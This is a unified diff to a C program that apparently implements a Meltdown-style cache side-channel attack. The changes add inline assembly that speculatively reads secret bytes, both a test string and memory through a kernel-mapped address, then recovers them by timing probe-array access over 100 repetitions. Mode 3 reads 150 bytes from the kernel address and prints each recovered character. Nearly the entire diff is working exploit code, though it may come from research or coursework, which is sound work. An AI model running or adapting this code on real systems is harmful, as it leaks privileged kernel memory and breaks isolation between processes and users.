@@ -199,7 +199,8 @@ int main(int argc, char * argv[])
     }
     // secret value test
     else if(argument == 2){
-        uint8_t * secret = (uint8_t *) malloc(sizeof(MELTDOWN) + 1); 
+        uint8_t * secret = (uint8_t *) malloc(sizeof(MELTDOWN) + 1);
+        uint8_t * base_secret = secret;
         strcpy(secret, MELTDOWN);
         //uint8_t * kernel_pointer = (uint8_t *)(PHYS_OFFSET + get_phys_addr(secret));   
 
@@ -217,84 +218,104 @@ int main(int argc, char * argv[])
         int loopCount = 0;
         while(loopCount < 16)
         {
-            // point to the beginning
-            probe_array = arr;
-
-            // read secret pointer
-            asm volatile(
-                // clear rax
-                "mov $0, %%rax\n"
-                "mfence\n"
-                // read the value that is pointed by kernel pointer
-                // to the rax register
-
-                // move zero extended byte to long
-                "movzbl (%1), %%rax\n"
-                // race condition begins
-                // multiply by 4096
-                "shl $12, %%rax\n"
-                // compute the probe array address
-                "add %%rax, %%rcx\n"
-                "mov (%%rcx), %%rdx"
-                :"+c"(&probe_array[0])
-                :"b"(secret)
-                :"rax", "rdx"
-            );
-
-            // preparation for measurement 
-            register uint64_t delta;
-            uint64_t* differenceArray = (uint64_t *) malloc (256 * sizeof(uint64_t));
-            
-            // point to the beginning
-            probe_array = arr;
-            // measure time differences for each element
+            uint64_t* foundChars =(uint64_t*) malloc(sizeof(uint64_t) * 256);
+            // set all elements to 0
             for (int i = 0; i < 256; i++)
             {
-                asm volatile(
-                    "mfence\n"
-                    "lfence\n"
-                    // start timer
-                    "rdtscp\n"
-                    // move counter to the r10
-                    "mov %%rax, %%r10\n"
-                    // try to read element of probe array to the rax
-                    "mov (%1), %%rcx\n"
-                    // read the timer again
-                    "rdtscp;\n"
-                    // find the difference between measurements
-                    "sub %%r10, %%rax\n"
-                    // output
-                    : [delta]"=a"(delta)
-                    // input
-                    :"b"(&probe_array[i * 512])
-                    //:"rax","r10"
-                    :"rcx"
-                );
-                differenceArray[i] = delta;
+                foundChars[i] = 0;
             }
-            
-            // find smallest.
-            
-            int MIN_TIME = 1000;
-            uint64_t smallest = 300;
+
+            int REPT = 100;
+            while(REPT){
+                // point to the beginning
+                probe_array = arr;
+
+                // read secret pointer
+                asm volatile(
+                    // clear rax
+                    "mov $0, %%rax\n"
+                    "mfence\n"
+                    // read the value that is pointed by kernel pointer
+                    // to the rax register
+
+                    // move zero extended byte to long
+                    "movzbl (%1), %%rax\n"
+                    // race condition begins
+                    // multiply by 4096
+                    "shl $12, %%rax\n"
+                    // compute the probe array address
+                    "add %%rax, %%rcx\n"
+                    "mov (%%rcx), %%rdx"
+                    :"+c"(&probe_array[0])
+                    :"b"(secret)
+                    :"rax", "rdx"
+                );
+
+                // preparation for measurement 
+                register uint64_t delta;
+                uint64_t* differenceArray = (uint64_t *) malloc (256 * sizeof(uint64_t));
+                
+                // point to the beginning
+                probe_array = arr;
+                // measure time differences for each element
+                for (int i = 0; i < 256; i++)
+                {
+                    asm volatile(
+                        "mfence\n"
+                        "lfence\n"
+                        // start timer
+                        "rdtscp\n"
+                        // move counter to the r10
+                        "mov %%rax, %%r10\n"
+                        // try to read element of probe array to the rax
+                        "mov (%1), %%rcx\n"
+                        // read the timer again
+                        "rdtscp;\n"
+                        // find the difference between measurements
+                        "sub %%r10, %%rax\n"
+                        // output
+                        : [delta]"=a"(delta)
+                        // input
+                        :"b"(&probe_array[i * 512])
+                        //:"rax","r10"
+                        :"rcx"
+                    );
+                    differenceArray[i] = delta;
+                }
+                // set access times to foundChars array
+                for (int i = 0; i < 256; i++)
+                {
+                    // for getting rid of the abnormal values
+                    if(differenceArray[i] > 200)
+                        differenceArray[i] = 200;
+                    foundChars[i] += differenceArray[i];
+                }
+                free(differenceArray);
+                //sleep(0.5);
+                flushprobe(arr);
+                REPT--;
+            }
+
+            // find minimum value in the foundChar array
+            uint64_t min = 10000000000;
+            int index = -1;
             for (int i = 0; i < 256; i++)
             {
-                if(differenceArray[i] < MIN_TIME){
-                    smallest = i;
-                    MIN_TIME = differenceArray[i];
+                // 100 is REPT
+                if(min > foundChars[i]/100){
+                    min = foundChars[i]/100;
+                    index = i;
                 }
             }
-            // found, advance
-            if(MIN_TIME < THRESHOLD){
-                printf("FOUND THE SECRET\n");
-                printf("sp:%p \t lc:%d \t item:%ld \t delta:%ld \t %c\n", secret, loopCount, smallest, differenceArray[smallest], smallest);
-                secret++;
-                loopCount ++;    
-            }
-            free(differenceArray);
-            sleep(0.5);
-            flushprobe(arr);
+
+            printf("kp:%p \t index:%d\t%c \t time:%ld\n",secret, index, index, min);
+
+            free(foundChars);
+            secret++;
+            loopCount++;
+            
         }
+        free(base_secret);
     }
     
     else if(argument == 3){
@@ -303,21 +324,20 @@ int main(int argc, char * argv[])
         uint8_t * secret = (uint8_t *) malloc(sizeof(MELTDOWN) + 1); 
         strcpy(secret, MELTDOWN);
         uint8_t * kernel_pointer = (uint8_t *)(PHYS_OFFSET + get_phys_addr(secret));   
-        
-        //printf("pointer:%p\n", kernel_pointer);
+        //uint8_t * base_kernel_pointer = kernel_pointer;
 
-        //uint8_t * kernel_pointer = (uint8_t * )PHYS_OFFSET;
-
-        while(1){
+        // read 150 character starting from kernel_pointer location
+        int len = 150;
+        while(len){
            
-            int* foundChars =(int*) malloc(sizeof(int) * 256);
+            uint64_t* foundChars =(uint64_t*) malloc(sizeof(uint64_t) * 256);
             // set all elements to 0
             for (int i = 0; i < 256; i++)
             {
                 foundChars[i] = 0;
             }
 
-            int REPT = 10;
+            int REPT = 100;
             while(REPT){
                 // point to the beginning
                 probe_array = arr;
@@ -350,7 +370,7 @@ int main(int argc, char * argv[])
                 register uint64_t delta;
                 uint64_t* differenceArray = (uint64_t *) malloc (256 * sizeof(uint64_t));
                 
-                // point to the beginning
+                // point to the beginning since we have moved the head while trying to access
                 probe_array = arr;
 
                 // measure time differences for each element
@@ -378,48 +398,42 @@ int main(int argc, char * argv[])
                     );
                     differenceArray[i] = delta;
                 }
-                // find smallest.
-                int MIN_TIME = 1000;
-                uint64_t smallest = 300;
+                // set access times to foundChars array
                 for (int i = 0; i < 256; i++)
                 {
-                    if(differenceArray[i] < MIN_TIME){
-                        smallest = i;
-                        MIN_TIME = differenceArray[i];
-                    }
-                }
-                
-                
-                if(MIN_TIME < THRESHOLD){
-                    foundChars[smallest] +=1;
+                    // for getting rid of the abnormal values
+                    if(differenceArray[i] > 200)
+                        differenceArray[i] = 200;
+                    foundChars[i] += differenceArray[i];
                 }
                 free(differenceArray);
                 
                 flushprobe(arr);
-                //printf(";");
                 REPT--;
             }
 
-            // print the most repatitive one
-            int MAXFOUND = 0;
-            int kernelvalue = 0;
+            // find minimum value in the foundChar array
+            uint64_t min = 10000000000;
+            int index = -1;
             for (int i = 0; i < 256; i++)
             {
-                if(foundChars[i] > MAXFOUND){
-                    kernelvalue = i;
-                    MAXFOUND = foundChars[i];
+                // 100 is REPT
+                if(min > foundChars[i]/100){
+                    min = foundChars[i]/100;
+                    index = i;
                 }
-                //printf("foundChars[%d]:%d\n", i, foundChars[i]);
             }
-            printf("%c ",kernelvalue);
+
+            printf("kp:%p \t index:%d\t%c \t time:%ld\n",kernel_pointer, index, index, min);
 
             free(foundChars);
             kernel_pointer++;
+            len--;
         }
+        //free(base_kernel_pointer);
+        //free(secret);  
     }
-    
-    
-    
-
+    printf("Last free\n");
+    free(arr);
     return 0;
 }
